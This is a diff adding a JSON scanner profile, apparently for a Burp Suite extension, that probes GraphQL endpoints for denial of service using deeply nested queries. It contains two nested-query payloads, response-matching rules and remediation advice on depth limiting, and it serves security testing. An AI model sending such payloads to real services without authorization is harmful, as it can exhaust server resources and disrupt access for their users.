@@ -1,0 +1,55 @@
+[
+  {
+    "profile_name": "GraphQL_Nested_Query_DoS",
+    "enabled": true,
+    "scanner": "active",
+    "author": "@bountysecurity",
+    "steps": [
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,{\"query\":\"{\\n  friends {\\n    friends {\\n      friends {\\n        friends {\\n          friends {\\n            friends {\\n              name\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\"}",
+          "true,{\"query\":\"{\\n  posts {\\n    comments {\\n      author {\\n        posts {\\n          comments {\\n            author {\\n              name\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\"}"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [
+          "user_provided",
+          "entire_body_json"
+        ],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Regex,,\"data\":\\s*\\{[^}]+\\}",
+          "true,OR,Simple String,,\"errors\":",
+          "true,AND,Content Type,,application/json"
+        ],
+        "redir_type": "always",
+        "max_redir": 5,
+        "show_alert": "always",
+        "issue_name": "GraphQL Nested Query DoS",
+        "issue_severity": "Medium",
+        "issue_confidence": "Firm",
+        "issue_detail": "The GraphQL endpoint accepts deeply nested queries without implementing depth limits. This could be exploited to perform denial of service attacks by crafting queries that require exponential amounts of processing time and memory.",
+        "remediation_detail": "Implement query depth limiting to prevent deeply nested queries. Consider using tools like graphql-depth-limit to reject queries that exceed a defined depth threshold, typically 5-7 levels deep depending on your application's needs.",
+        "issue_background": "",
+        "remediation_background": ""
+      }
+    ],
+    "Tags": [
+      "GraphQL",
+      "DoS",
+      "All"
+    ]
+  }
+]
